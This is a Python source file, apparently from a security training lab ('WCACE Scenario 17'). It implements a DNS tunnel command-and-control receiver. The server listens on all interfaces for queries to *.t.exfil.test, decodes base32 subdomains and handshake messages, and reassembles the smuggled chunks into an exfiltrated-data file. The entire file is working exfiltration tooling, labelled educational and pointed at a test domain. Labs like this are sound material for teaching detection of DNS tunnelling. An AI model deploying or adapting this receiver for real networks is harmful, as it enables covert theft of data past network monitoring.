#!/usr/bin/env python3
"""
Scenario 17: DNS Tunnel C2 Receiver.

Simple authoritative DNS server using dnslib that receives DNS queries for
*.t.exfil.test, decodes the base32-encoded subdomains, and reassembles the
exfiltrated data. Acts as the command-and-control (C2) receiver endpoint.

Usage:
    python3 dns_server.py [--port 5353] [--output /tmp/exfil_output.txt]
"""

import argparse
import base64
import os
import sys
import time
from datetime import datetime

from colorama import Fore, Style, init

# Add project root to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", ".."))

from wcace_lib.constants import DNS_TUNNEL_DOMAIN

init(autoreset=True)

try:
    from dnslib import DNSRecord, DNSHeader, RR, QTYPE, TXT, CNAME, A
    from dnslib.server import DNSServer, BaseResolver
except ImportError:
    print(f"{Fore.RED}[!] dnslib not installed. Run: pip install dnslib{Style.RESET_ALL}")
    sys.exit(1)


class TunnelResolver(BaseResolver):
    """DNS resolver that decodes tunnelled data from query subdomains."""

    def __init__(self, tunnel_domain: str, output_file: str):
        self.tunnel_domain = tunnel_domain.rstrip(".")
        self.output_file = output_file
        self.received_chunks: dict[int, bytes] = {}
        self.session_id: str | None = None
        self.total_queries = 0
        self.start_time: float | None = None

    def resolve(self, request, handler):
        """Handle incoming DNS query and extract tunnelled data."""
        reply = request.reply()
        qname = str(request.q.qname).rstrip(".")
        qtype = QTYPE[request.q.qtype]

        self.total_queries += 1
        if self.start_time is None:
            self.start_time = time.time()

        # Check if query is for our tunnel domain
        if qname.endswith(self.tunnel_domain):
            subdomain = qname[: -(len(self.tunnel_domain) + 1)]
            self._process_tunnel_query(subdomain, qtype, reply, qname)
        else:
            # Not our domain, return NXDOMAIN-like empty response
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"  {Fore.WHITE}[{timestamp}] PASS  {qtype:5s} {qname}{Style.RESET_ALL}")

        return reply

    def _process_tunnel_query(self, subdomain: str, qtype: str,
                              reply, qname: str):
        """Decode and store data from a tunnel query."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        parts = subdomain.split(".")

        # Try to decode the data portion
        try:
            if len(parts) >= 2:
                # Format: <seq>.<base32data>
                seq_str = parts[0]
                b32_data = parts[1].upper()

                # Pad base32 data
                padding = (8 - len(b32_data) % 8) % 8
                b32_data += "=" * padding

                decoded = base64.b32decode(b32_data)

                # Check if this is a control message
                decoded_str = decoded.decode("utf-8", errors="replace")

                if decoded_str.startswith("INIT:"):
                    print(f"  {Fore.CYAN}[{timestamp}] INIT  {qtype:5s} Tunnel handshake received{Style.RESET_ALL}")
                    reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("OK"), ttl=0))
                    return

                if decoded_str.startswith("START:"):
                    self.session_id = decoded_str.split(":")[1]
                    print(f"  {Fore.CYAN}[{timestamp}] START {qtype:5s} Session ID: {self.session_id}{Style.RESET_ALL}")
                    reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(f"ACK:{self.session_id}"), ttl=0))
                    return

                if decoded_str.startswith("END:"):
                    end_parts = decoded_str.split(":")
                    expected_chunks = int(end_parts[1]) if len(end_parts) > 1 else 0
                    print(f"  {Fore.GREEN}[{timestamp}] END   {qtype:5s} "
                          f"Expected: {expected_chunks} chunks, "
                          f"Received: {len(self.received_chunks)}{Style.RESET_ALL}")
                    self._reassemble_output()
                    reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("COMPLETE"), ttl=0))
                    return

                # Regular data chunk
                seq = int(seq_str)
                self.received_chunks[seq] = decoded
                chunk_preview = decoded_str[:30].replace("\n", "\\n")
                print(f"  {Fore.YELLOW}[{timestamp}] DATA  {qtype:5s} "
                      f"seq={seq:04d} len={len(decoded):3d}B "
                      f"preview=\"{chunk_preview}...\"{Style.RESET_ALL}")

                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(f"ACK:{seq}"), ttl=0))

            else:
                # Single label - try direct decode
                b32_data = subdomain.upper()
                padding = (8 - len(b32_data) % 8) % 8
                b32_data += "=" * padding
                decoded = base64.b32decode(b32_data)
                print(f"  {Fore.YELLOW}[{timestamp}] RAW   {qtype:5s} len={len(decoded)}B{Style.RESET_ALL}")
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("ACK"), ttl=0))

        except Exception as e:
            print(f"  {Fore.RED}[{timestamp}] ERR   {qtype:5s} "
                  f"Failed to decode: {subdomain[:50]}... ({e}){Style.RESET_ALL}")
            reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("ERR"), ttl=0))

    def _reassemble_output(self):
        """Reassemble received chunks and write to output file."""
        if not self.received_chunks:
            print(f"  {Fore.RED}[!] No chunks to reassemble{Style.RESET_ALL}")
            return

        # Sort by sequence number and concatenate
        sorted_seqs = sorted(self.received_chunks.keys())
        assembled = b"".join(self.received_chunks[seq] for seq in sorted_seqs)

        # Write to output file
        os.makedirs(os.path.dirname(self.output_file) or ".", exist_ok=True)
        with open(self.output_file, "wb") as f:
            f.write(assembled)

        elapsed = time.time() - self.start_time if self.start_time else 0

        print(f"\n{Fore.GREEN}{'='*60}")
        print(f"  EXFILTRATED DATA REASSEMBLED")
        print(f"{'='*60}{Style.RESET_ALL}")
        print(f"  Chunks received : {len(self.received_chunks)}")
        print(f"  Total bytes     : {len(assembled)}")
        print(f"  Total queries   : {self.total_queries}")
        print(f"  Duration        : {elapsed:.1f}s")
        print(f"  Output file     : {self.output_file}")
        print(f"\n{Fore.CYAN}--- Decoded content ---{Style.RESET_ALL}")
        try:
            print(assembled.decode("utf-8"))
        except UnicodeDecodeError:
            print(f"  (binary data, {len(assembled)} bytes)")
        print(f"{Fore.CYAN}--- End of content ---{Style.RESET_ALL}")

        # Reset for next session
        self.received_chunks.clear()
        self.session_id = None
        self.start_time = None
        self.total_queries = 0


def main():
    parser = argparse.ArgumentParser(description="DNS Tunnel C2 Receiver")
    parser.add_argument("--port", type=int, default=5353,
                        help="UDP port to listen on (default: 5353)")
    parser.add_argument("--output", type=str,
                        default=os.path.join(os.path.dirname(__file__), "..",
                                             "logs", "sample_logs", "exfiltrated_data.txt"),
                        help="Output file for reassembled data")
    args = parser.parse_args()

    print(f"""
{Fore.RED}{'='*62}
  WCACE Scenario 17: DNS Tunnel C2 Receiver
  Listening on  : UDP port {args.port}
  Tunnel domain : {DNS_TUNNEL_DOMAIN}
  Output file   : {args.output}
  WARNING: Educational use only
{'='*62}{Style.RESET_ALL}
""")

    resolver = TunnelResolver(DNS_TUNNEL_DOMAIN, args.output)
    server = DNSServer(resolver, port=args.port, address="0.0.0.0", tcp=False)

    print(f"{Fore.GREEN}[*] DNS tunnel receiver started on UDP :{args.port}")
    print(f"[*] Waiting for tunnel queries to *.{DNS_TUNNEL_DOMAIN}...{Style.RESET_ALL}\n")

    try:
        server.start()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Shutting down DNS server...{Style.RESET_ALL}")
        server.stop()


if __name__ == "__main__":
    main()
